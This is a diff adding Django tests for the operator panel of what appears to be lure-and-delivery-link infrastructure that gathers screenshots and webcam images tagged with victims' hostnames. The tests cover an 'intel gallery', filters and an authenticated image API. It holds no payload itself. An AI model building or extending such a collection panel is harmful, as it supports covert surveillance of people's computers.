@@ -2408,3 +2408,87 @@ class LureAndDecoySiteTests(TestCase):
     def test_nav_links_to_lures(self):
         response = self.client.get(reverse("overview"))
         self.assertContains(response, reverse("gate-lures"))
+
+
+@override_settings(AUTO_BAN_THRESHOLD=0)
+class GateIntelTests(TestCase):
+    def setUp(self):
+        self.operator = Operator.objects.create_user(username="giop", password="long-enough-password-123")
+        self.client = Client()
+        self.client.force_login(self.operator)
+        self.public = Client()
+
+    def _png(self, tag=b"A"):
+        # A real 1x1 PNG (valid header + IHDR) so the bytes render as an image.
+        return (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
+                b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89" + tag)
+
+    def _submission_with_image(self, path="/g/gi/one", hostname="ws-01", field="screenshot"):
+        link = DeliveryLink.objects.create(path=path, kind="file", placeholder="blank")
+        sub = Submission.objects.create(
+            link=link, decoded_json={"hostname": hostname}, client_ip_hash="c" * 64)
+        image = SubmissionImage.objects.create(
+            submission=sub, field_name=field,
+            image=ContentFile(self._png(), name="shot.png"), content_type="image/png")
+        return link, sub, image
+
+    def test_link_detail_intel_gallery(self):
+        link, sub, image = self._submission_with_image()
+        response = self.client.get(reverse("gate-link-detail", args=[link.pk]))
+        self.assertContains(response, "INTEL GALLERY")
+        self.assertContains(response, "intel-card")
+        self.assertContains(response, reverse("gate-submission-image", args=[image.pk]))
+        self.assertContains(response, "data-lightbox")
+        self.assertContains(response, "screenshot")
+
+    def test_link_detail_gallery_absent_without_images(self):
+        link = DeliveryLink.objects.create(path="/g/gi/none", kind="file")
+        response = self.client.get(reverse("gate-link-detail", args=[link.pk]))
+        self.assertNotContains(response, "INTEL GALLERY")
+
+    def test_intel_page_lists_images_with_context(self):
+        self._submission_with_image()
+        response = self.client.get(reverse("gate-intel"))
+        self.assertContains(response, "intel-card")
+        self.assertContains(response, "ws-01")
+        self.assertContains(response, "/g/gi/one")
+        self.assertContains(response, "lightbox.js")
+
+    def test_intel_page_filters(self):
+        self._submission_with_image(path="/g/gi/one", hostname="ws-01", field="screenshot")
+        self._submission_with_image(path="/g/gi/two", hostname="ws-02", field="webcam")
+        response = self.client.get(reverse("gate-intel") + "?link=two")
+        self.assertContains(response, "ws-02")
+        self.assertNotContains(response, "ws-01")
+        response = self.client.get(reverse("gate-intel") + "?field=webcam")
+        self.assertContains(response, "ws-02")
+        self.assertNotContains(response, "ws-01")
+
+    def test_intel_page_empty_state(self):
+        response = self.client.get(reverse("gate-intel"))
+        self.assertContains(response, "No imagery yet")
+
+    def test_submissions_table_thumbs_open_lightbox(self):
+        self._submission_with_image()
+        response = self.client.get(reverse("gate-submissions") + "?status=pending")
+        self.assertContains(response, "data-lightbox")
+        self.assertContains(response, "lightbox.js")
+
+    def test_nav_links_to_intel(self):
+        response = self.client.get(reverse("overview"))
+        self.assertContains(response, reverse("gate-intel"))
+
+    def test_api_submissions_nest_images_and_serve_bytes(self):
+        _, raw = APIKey.create(operator=self.operator, name="ci")
+        auth = {"HTTP_AUTHORIZATION": f"ApiKey {raw}"}
+        link, sub, image = self._submission_with_image()
+        listing = self.client.get("/api/v1/submissions/", **auth)
+        entry = next(item for item in listing.json() if item["id"] == sub.pk)
+        self.assertEqual(entry["images"][0]["field_name"], "screenshot")
+        self.assertIn(f"/api/v1/submissions/image/{image.pk}/", entry["images"][0]["url"])
+        response = self.client.get(entry["images"][0]["url"], **auth)
+        self.assertEqual(response.status_code, 200)
+        self.assertEqual(b"".join(response.streaming_content), image.image.open("rb").read())
+        # anonymous callers get nothing
+        anon = self.public.get(entry["images"][0]["url"])
+        self.assertIn(anon.status_code, (401, 403))
